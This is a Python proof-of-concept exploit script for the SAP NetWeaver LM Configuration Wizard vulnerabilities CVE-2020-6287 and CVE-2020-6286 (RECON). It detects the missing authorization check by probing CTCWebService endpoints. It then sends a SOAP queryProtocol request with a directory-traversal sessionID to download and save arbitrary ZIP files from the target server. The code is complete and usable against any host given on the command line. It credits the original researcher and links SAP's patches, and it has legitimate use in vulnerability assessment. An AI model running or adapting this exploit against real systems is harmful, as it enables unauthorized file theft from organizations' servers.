#!/usr/bin/env python3

__author__ = 'chipik'

import base64
import random
import requests
import argparse
import xml.etree.ElementTree as ET

help_desc = '''
PoC for CVE-2020-6287, CVE-2020-6286 (RECON)
This scrip allows to check SAP LM Configuration Wizard missing authorization check vulnerability and exploits dir traversal in queryProtocol method
Original finding: Pablo Artuso. https://twitter.com/lmkalg
Solution: https://launchpad.support.sap.com/#/notes/2934135, https://launchpad.support.sap.com/#/notes/2939665
'''


def detect_vuln(base_url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC"}
    status = 'OK'
    checks =  [{"name":"Check1","path":"/CTCWebService/CTCWebServiceBean","sign_status":405},
               {"name":"Check2","path":"/CTCWebService/CTCWebServiceBean?wsdl","sign_status":200, 
                   "content_type": ["application/xml", "text/xml"]},
               {"name":"Check3","path":"/CTCWebService/Config1?wsdl","sign_status":200,
                   "content_type": ["application/xml", "text/xml"]}]

    for check in checks:
        ans = requests.get(base_url + check['path'], headers=headers, timeout=timeout, allow_redirects=False, verify=False)
        content_type = ans.headers.get("Content-Type", "").lower()
        status_code = ans.status_code
    
        # Assume at first vuln doesn't exist, and check for tell-tale of vuln based on response
        is_vulnerable = False

        # Check the status code
        if status_code == check['sign_status']:

            # Also check the content type of response if specified
            if 'content_type' in check:
                
                # list of acceptable content types to check through
                if isinstance(check['content_type'], list):
                    is_vulnerable = any([ct in content_type for ct in check['content_type']])

                # single content type provided - check if it exists in response
                else:
                    if check['content_type'] in content_type:
                        is_vulnerable = True

            else:
                # If no content type, determine vulnerability based on status code only
                is_vulnerable = True

        if is_vulnerable:
            status = 'Vulnerable! [CVE-2020-6287] (RECON)'
            print ("%s - %s - %s" %(check['name'], status, base_url + check['path'] ))
            return {"status":True, "url":base_url + check['path']}

        else:
            print ("%s - %s" %(check['name'], status))

    return {"status":False, "url":""}


def exploit_traversal(url, zipfile):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6286 PoC",
        "Content-Type":"text/xml;charset=UTF-8"}
    xml = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
   <soapenv:Header/>
   <soapenv:Body>
      <urn:queryProtocol>
         <sessionID>/../../../../../../../../../../../../../../../../../..%s</sessionID>
      </urn:queryProtocol>
   </soapenv:Body>
</soapenv:Envelope>
    ''' % (zipfile.replace(".zip",""))
    ans = requests.post(url, headers=headers, timeout=timeout, data=xml, verify=False)
    if ans.status_code == 200:
        myroot = ET.fromstring(ans.content)
        zipb64 = ''
        for ret_val in myroot.iter('return'):
            zipb64 = ret_val.text
        if zipb64:
            zipdata = base64.b64decode(zipb64)
            filename = "zipfile_%d.zip" %(random.randint(1, 10000))
            with open(filename, 'wb') as f:
                f.write(zipdata)
            print("Ok! File %s was saved" % (filename))
        else:
            print("Error! Can't read file %s. Look's like there is no file %s on the server" % (zipfile, zipfile))
    else:
        print("Error! Can't read file %s. Status: %s" % (zipfile, ans.status_code))
    return


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-H', '--host', default='127.0.0.1', help='Java NW host (default: 127.0.0.1)')
    parser.add_argument('-P', '--port', default=50000, type=int, help='Java NW web port (default: tcp/50000)')
    parser.add_argument('-s', '--ssl', action='store_true', help='enable SSL')
    parser.add_argument('-c', '--check', action='store_true', help='just detect vulnerability')
    parser.add_argument('-f', '--zipfile', default='', help='ZIP file to read. CVE-2020-6286')
    parser.add_argument('--timeout', default=10, type=int, help='HTTP connection timeout in second (default: 10)')
    parser.add_argument('-v', '--verbose', action='store_true', help='verbose mode')
    args = parser.parse_args()
    timeout = args.timeout

    if args.ssl:
        base_url = "https://%s:%s" % (args.host, args.port)
    else:
        base_url = "http://%s:%s" % (args.host, args.port)
    if args.check:
        detect_vuln(base_url)
        exit()
    if args.zipfile:
        result = detect_vuln(base_url)
        if result["status"]:
            exploit_traversal(result["url"].replace("?wsdl",""),args.zipfile)


